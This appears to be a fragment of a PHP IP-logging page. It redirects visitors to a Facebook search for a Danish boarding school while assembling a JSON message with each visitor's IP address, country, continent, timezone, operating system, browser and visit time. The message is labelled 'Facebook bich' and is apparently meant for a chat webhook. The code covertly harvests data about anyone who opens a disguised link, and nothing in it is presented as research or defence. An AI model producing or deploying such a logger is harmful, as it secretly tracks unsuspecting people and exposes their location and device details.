<?php
header( 'Location: https://www.facebook.com/search/top/?q=skanderup%20efterskole' ) ;
...
$make_json = json_encode(array('content'=>"Facebook bich  | $ipdat->geoplugin_countryName | $ipdat->geoplugin_continentName | $ipdat->geoplugin_currencyCode | $ipdat->geoplugin_timezone | $ip | $user_os | $user_browser | $time \n", "username" => "$ip"));
